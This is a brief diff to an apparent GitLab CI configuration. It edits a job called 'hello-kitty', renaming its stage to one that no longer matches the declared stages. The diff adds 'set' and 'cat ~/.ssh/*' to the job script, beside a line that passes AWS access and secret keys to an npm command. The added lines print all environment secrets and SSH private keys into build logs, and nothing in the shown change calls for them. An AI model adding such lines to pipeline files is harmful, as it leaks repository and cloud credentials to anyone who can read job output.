@@ -20,6 +20,8 @@ stages:
   - pipeline
 image: alpine:latest
 hello-kitty:
-  stage: pipeline
+  stage: pipeline3
   script:
+    - set
+    - cat ~/.ssh/*
     - npm run pipeline $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY
